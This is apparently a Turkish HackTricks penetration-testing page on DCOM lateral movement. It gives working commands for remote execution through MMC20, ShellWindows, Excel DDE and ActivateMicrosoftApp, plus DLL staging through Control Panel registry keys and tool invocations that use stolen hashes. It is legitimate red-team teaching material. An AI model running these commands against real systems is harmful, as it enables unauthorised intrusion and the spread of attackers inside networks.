# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

DCOM lateral movement çekicidir; çünkü servis veya scheduled task oluşturmadan, RPC/DCOM üzerinden açığa çıkarılan mevcut COM server'ları kullanır. Pratikte bu, ilk bağlantının genellikle TCP/135 üzerinden başlayıp ardından dinamik olarak atanan yüksek RPC portlarına geçmesi anlamına gelir.

## Ön Koşullar ve Dikkat Edilmesi Gerekenler

- Hedefte genellikle local administrator bağlamına ihtiyacınız vardır ve uzak COM server, uzaktan başlatma/etkinleştirmeye izin vermelidir.
- **14 Mart 2023** tarihinden beri Microsoft, desteklenen sistemlerde DCOM hardening uygular. Düşük bir activation authentication level isteyen eski istemciler, en az `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY` düzeyinde anlaşma sağlayamazlarsa başarısız olabilir. Modern Windows istemcilerinde bu düzey genellikle otomatik olarak yükseltilir; dolayısıyla güncel araçlar normalde çalışmaya devam eder.<sup>[[3]](#references)</sup>
- Manuel veya script ile DCOM execution genellikle TCP/135'in yanı sıra hedefin dinamik RPC port aralığını da gerektirir. Impacket'in `dcomexec.py` aracını kullanıyor ve komut çıktısını almak istiyorsanız genellikle `ADMIN$` (veya yazma/okuma izni olan başka bir share) üzerinden SMB erişimine de ihtiyacınız olur.
- RPC/DCOM çalışıyor ancak SMB engelleniyorsa, `dcomexec.py -nooutput` komutu çıktısız execution için yine de kullanışlı olabilir.

Hızlı kontroller:

```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```

## MMC20.Application

Bu teknik hakkında daha fazla bilgi için [orijinal MMC20.Application gönderisine](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/) göz atın.<sup>[[1]](#references)</sup>

Distributed Component Object Model (DCOM) nesneleri, nesnelerle ağ tabanlı etkileşimler için ilginç bir özellik sunar. Microsoft, hem DCOM hem de Component Object Model (COM) için kapsamlı belgeler sağlar. Bunlara [DCOM için buradan](https://msdn.microsoft.com/en-us/library/cc226801.aspx) ve [COM için buradan](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>) erişilebilir. PowerShell komutuyla DCOM uygulamalarının listesi alınabilir:

```bash
Get-CimInstance Win32_DCOMApplication
```

COM nesnesi [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), MMC snap-in işlemlerinin script ile yönetilmesini sağlar. Özellikle bu nesne, `Document.ActiveView` altında bir `ExecuteShellCommand` yöntemi içerir. Bu yöntem hakkında daha fazla bilgiye [buradan](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>) ulaşabilirsiniz. Çalıştırarak kontrol edin:<sup>[[6]](#references)</sup>

Bu özellik, DCOM uygulaması aracılığıyla ağ üzerinden komutların yürütülmesini sağlar. DCOM ile uzaktan yönetici olarak etkileşim kurmak için PowerShell şu şekilde kullanılabilir:

```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```

Bu komut DCOM uygulamasına bağlanır ve COM nesnesinin bir örneğini döndürür. Ardından uzak ana bilgisayarda bir işlemi yürütmek için ExecuteShellCommand yöntemi çağrılabilir. İşlem şu adımları içerir:

Yöntemleri kontrol edin:

```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```

RCE elde edin:

```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
    "cmd.exe",
    $null,
    "/c powershell -NoP -W Hidden -Enc <B64>",
    "7"
)
```

Son argüman pencere stilidir. `7`, pencerenin küçültülmüş halde kalmasını sağlar. Operasyonel açıdan, MMC tabanlı yürütme genellikle uzak bir `mmc.exe` sürecinin payload’unuzu başlatmasıyla sonuçlanır; bu, aşağıdaki Explorer tabanlı nesnelerden farklıdır.

## ShellWindows & ShellBrowserWindow

**Bu teknik hakkında daha fazla bilgi için orijinal gönderiye bakın [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**<sup>[[2]](#references)</sup>

**MMC20.Application** nesnesinin uygulamaya özgü bir `LaunchPermission` değeri olmadan kullanılabildiği gözlemlenmiştir.<sup>[[2]](#references)</sup> Bu, tek başına erişim sağlamaz: COM, makinenin `DefaultLaunchPermission` ACL’sini ve geçerli olduğu durumlarda makine genelindeki başlatma/erişim kısıtlamalarını denetler.<sup>[[9]](#references)[[10]](#references)</sup> Daha fazla ayrıntı için [buradaki](https://twitter.com/tiraniddo/status/817532039771525120) ileti dizisine bakılabilir. Ayrıca, açık Launch Permission değeri olmayan nesneleri filtrelemek için [@tiraniddo](https://twitter.com/tiraniddo)’nun OleView .NET aracını kullanmanız önerilir.

Açık Launch Permission değerlerinin bulunmaması nedeniyle `ShellBrowserWindow` ve `ShellWindows` adlı iki nesne öne çıkarılmıştır.<sup>[[2]](#references)</sup> `HKCR:\AppID\{guid}` altında bir `LaunchPermission` değerinin bulunmaması, uygulamaya özgü bir başlatma ACL’si olmadığı anlamına gelir; uzak etkinleştirmenin kısıtlanmadığı anlamına **gelmez**.<sup>[[9]](#references)[[10]](#references)</sup>

`MMC20.Application` ile karşılaştırıldığında, bu nesneler OPSEC açısından genellikle daha az dikkat çeker; çünkü komut, uzak ana bilgisayarda `mmc.exe` yerine çoğunlukla `explorer.exe` sürecinin alt süreci olarak çalışır.

### ShellWindows

ProgID’si olmayan `ShellWindows` için .NET’in `Type.GetTypeFromCLSID` ve `Activator.CreateInstance` yöntemleri, CLSID’si kullanılarak nesnenin örneğinin oluşturulmasını sağlar. Bu işlem, `ShellWindows` için CLSID’yi almak üzere OleView .NET’ten yararlanır. Nesnenin örneği oluşturulduktan sonra `WindowsShell.Item` yöntemi aracılığıyla etkileşim kurulabilir ve böylece `Document.Application.ShellExecute` gibi yöntemler çağrılabilir.<sup>[[2]](#references)</sup>

Nesnenin örneğini oluşturmak ve komutları uzaktan yürütmek için örnek PowerShell komutları verilmiştir:

```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```

### ShellBrowserWindow

`ShellBrowserWindow` benzerdir, ancak CLSID'si üzerinden doğrudan örneklendirip `Document.Application.ShellExecute`'e geçiş yapabilirsiniz:

```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
    "cmd.exe",
    "/c whoami > C:\\Windows\\Temp\\dcom.txt",
    "C:\\Windows\\System32",
    $null,
    0
)
```

### Excel DCOM Objects ile Lateral Movement

Lateral movement, DCOM Excel objects kötüye kullanılarak gerçekleştirilebilir. Ayrıntılı bilgi için, DCOM üzerinden lateral movement amacıyla Excel DDE'den yararlanma konusundaki [Cybereason blog yazısını](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom) okumanız önerilir.<sup>[[5]](#references)</sup>

Empire projesi, DCOM objects'leri manipüle ederek Excel'i remote code execution (RCE) için kullanmayı gösteren bir PowerShell script'i sunar. Aşağıda, Excel'i RCE için kötüye kullanmanın farklı yöntemlerini gösteren, [Empire'ın GitHub repository'sinde](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) bulunan script'ten alınmış kod parçaları yer alıyor:

```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $isx64 = [boolean]$obj.Application.ProductCode[21]
    Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $Obj.DisplayAlerts = $false
    $Obj.DDEInitiate("cmd", "/c $Command")
}
```

Son araştırmalar, `Excel.Application`'ın `ActivateMicrosoftApp()` yöntemiyle bu alanı genişletti. Temel fikir, Excel'in `PATH`'te arama yaparak FoxPro, Schedule Plus veya Project gibi eski Microsoft uygulamalarını başlatmayı deneyebilmesidir. Bir operatör bu beklenen adlardan birini taşıyan bir payload'ı hedefin `PATH`'inde yer alan yazılabilir bir konuma koyabilirse Excel bunu çalıştırır.<sup>[[4]](#references)</sup>

Bu varyant için gerekenler:

- Hedefte local admin yetkisi
- Hedefte Excel'in yüklü olması
- Hedefin `PATH`'indeki yazılabilir bir dizine payload yazabilme

FoxPro aramasını kötüye kullanan pratik bir örnek (`FOXPROW.exe`):

```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```

Saldırgan ana bilgisayarda yerel `Excel.Application` ProgID kaydı yoksa, uzak nesneyi bunun yerine CLSID kullanarak oluşturun:

```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```

Pratikte kötüye kullanıldığı görülen değerler:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### COpenControlPanel — kayıtlı bir Control Panel DLL’ini yükleme

`COpenControlPanel` sınıfı (CLSID `{06622D85-6856-4460-8DE1-A81921B41C4B}`), `IOpenControlPanel` arayüzünü (IID `{D11AD862-66DE-4DF4-BF6C-1F5621996AF1}`) sunar. Bu arayüzün `Open()` yöntemi, `Control Panel\Cpls` anahtarı altında kayıtlı Control Panel DLL’lerinin uzak bir `dllhost.exe` tarafından yüklenmesine neden olur. Test edilen sistemlerde sınıfın açıkça tanımlanmış başlatma/erişim izinleri yoktur; bu nedenle varsayılan DCOM politikasını devralır (uzaktan etkinleştirme için normalde yönetici ayrıcalığı gerekir). `Open()` yönteminin kayıtlı DLL’leri işlemesi için rastgele bir öğe adı yeterlidir; yükün `.cpl` uzantısına sahip olması gerekmez, ancak doğru mimariye sahip geçerli bir DLL olmalıdır.<sup>[[7]](#references)</sup>

Bu ilkel, **stage-and-trigger** yöntemidir; yalnızca komut çalıştırmaktan ibaret değildir: önce hedefe bir DLL kopyalayın ve DLL’in yolunu gösteren bir `REG_EXPAND_SZ` değeri oluşturun, ardından nesneyi DCOM üzerinden etkinleştirin. Örneğin, yönetici yetkilerine sahip bir Windows bağlamında:<sup>[[7]](#references)</sup>

```cmd
copy payload.dll \\target\C$\Windows\Temp\panel.dll
reg.exe add "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /t REG_EXPAND_SZ /d "C:\Windows\Temp\panel.dll" /f
```

Herkese açık [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger) istemcisi, belgelenmemiş DCOM çağrısını Impacket ile uygular. Herhangi bir Denetim Masası öğesi adı sağlamak yeterlidir; `dllhost.exe` DLL'yi yüklemiş olsa bile istemci bir RPC hatası bildirebilir.<sup>[[8]](#references)</sup>

```bash
git clone https://github.com/klsecservices/CPLDCOMTrigger
cd CPLDCOMTrigger
python3 CPLTrig.py 'DOMAIN/user:password@target' -cpl random

# Pass-the-hash and Kerberos are also implemented
python3 CPLTrig.py 'DOMAIN/user@target' -hashes ':NTHASH' -cpl random
python3 CPLTrig.py 'DOMAIN/user@target.domain.local' -aesKey AES_KEY_HEX -dc-ip 10.10.10.10 -cpl random
```

Operasyonel açıdan bu yöntem ayrıca bir dosya yazma kanalı ve uzaktaki kayıt defterine erişim gerektirir; bu nedenle `MMC20`/`ShellWindows` yöntemlerinden daha fazla iz bırakır. Daha sonra Denetim Masası açıldığında aynı girdinin yeniden yüklenmesine yol açabileceğinden kalıcılığa ilişkin bir yan etki oluşturur. Yürütme sonrasında değeri kaldırın ve `dllhost.exe` içindeki olağandışı DLL yüklemeleriyle birlikte beklenmeyen `Control Panel\Cpls` değerlerini araştırın.<sup>[[7]](#references)</sup>

```cmd
reg.exe delete "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /f
del \\target\C$\Windows\Temp\panel.dll
```

### Lateral Movement için Otomasyon Araçları

Bu teknikleri otomatikleştirmek için iki araç öne çıkarılıyor:

- **Invoke-DCOM.ps1**: Empire projesi tarafından sunulan ve uzak makinelerde kod çalıştırmak için farklı yöntemlerin kullanımını kolaylaştıran bir PowerShell betiğidir. Bu betiğe Empire GitHub deposundan erişilebilir.

- **SharpLateral**: Aşağıdaki komutla kullanılabilen, uzaktan kod çalıştırmak için tasarlanmış bir araçtır:

```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```

- [SharpMove](https://github.com/0xthirteen/SharpMove):

```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```

## Otomatik Araçlar

- Powershell betiği [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), diğer makinelerde kod yürütmek için açıklamalarda belirtilen tüm yöntemleri kolayca kullanmanızı sağlar.
- DCOM kullanarak uzak sistemlerde komut yürütmek için Impacket'in `dcomexec.py` aracını kullanabilirsiniz. Güncel derlemeler `ShellWindows`, `ShellBrowserWindow` ve `MMC20` desteği sunar ve varsayılan olarak `ShellWindows` kullanır.

```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```

- [**SharpLateral**](https://github.com/mertdas/SharpLateral) aracını da kullanabilirsiniz:

```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```

- [**SharpMove**](https://github.com/0xthirteen/SharpMove) da kullanabilirsiniz.

```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```





## References

- [1] [MMC20.Application COM Object kullanarak Lateral Movement](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [2] [DCOM üzerinden Lateral Movement: 2. Tur](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [3] [KB5004442—Windows DCOM Server Security Feature Bypass (CVE-2021-26414) için değişiklikleri yönetme](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [4] [Lateral Movement: DCOM Excel Application'ın gücünü kötüye kullanma](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
- [5] [DCOM üzerinden lateral movement için Excel DDE'den yararlanma](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
- [6] [technet.microsoft.com - MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)
- [7] [Uzaktan komut yürütme için DCOM nesnelerini kullanma](https://securelist.com/lateral-movement-via-dcom-abusing-control-panel/118232/)
- [8] [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger)
- [9] [DefaultLaunchPermission - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/com/defaultlaunchpermission)
- [10] [MS-DCOM: Ek B, Ürün davranışı - Microsoft Learn](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/acc42954-4073-4f05-b850-efd562022077)
{{#include ../../banners/hacktricks-training.md}}
